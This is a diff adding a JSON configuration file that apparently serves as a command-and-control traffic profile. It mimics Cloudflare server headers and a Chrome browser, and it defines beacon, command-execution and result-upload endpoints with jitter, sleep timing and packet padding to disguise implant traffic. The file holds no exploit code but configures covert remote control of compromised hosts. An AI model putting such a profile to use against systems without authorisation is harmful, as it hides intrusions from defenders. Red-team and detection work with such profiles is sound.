@@ -1,0 +1,90 @@
+{
+    "profile_name": "cloudflare_mimic",
+    "version": "1.0",
+    
+    "http": {
+        "server": {
+            "headers": [
+                "Server: cloudflare",
+                "Content-Type: text/html; charset=utf-8",
+                "Cache-Control: no-cache, no-store, must-revalidate",
+                "Pragma: no-cache",
+                "Expires: 0"
+            ],
+            "response": {
+                "type": "html",
+                "template": "templates/cloudflare.html"
+            }
+        },
+        "client": {
+            "headers": [
+                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language: en-US,en;q=0.5",
+                "Accept-Encoding: gzip, deflate, br",
+                "Connection: keep-alive",
+                "Upgrade-Insecure-Requests: 1",
+                "Sec-Fetch-Dest: document",
+                "Sec-Fetch-Mode: navigate",
+                "Sec-Fetch-Site: none",
+                "Sec-Fetch-User: ?1"
+            ],
+            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
+        }
+    },
+    
+    "beacon": {
+        "uris": [
+            "/api/v1/update",
+            "/api/v2/check",
+            "/status/health",
+            "/metrics",
+            "/data/sync"
+        ],
+        "methods": ["GET", "POST"],
+        "params": {
+            "beacon_id": "id",
+            "hostname": "h",
+            "timestamp": "ts"
+        }
+    },
+    
+    "commands": {
+        "uris": [
+            "/cmd/execute",
+            "/api/command",
+            "/task/run"
+        ],
+        "methods": ["POST"],
+        "params": {
+            "command": "cmd",
+            "args": "args"
+        }
+    },
+    
+    "results": {
+        "uris": [
+            "/result/upload",
+            "/api/output",
+            "/task/complete"
+        ],
+        "methods": ["POST"],
+        "params": {
+            "task_id": "tid",
+            "output": "out",
+            "status": "st"
+        }
+    },
+    
+    "malleable": {
+        "jitter": 0.3,
+        "sleep": {
+            "base": 60,
+            "variation": 20
+        },
+        "packet": {
+            "padding": true,
+            "min_size": 100,
+            "max_size": 500
+        }
+    }
+}
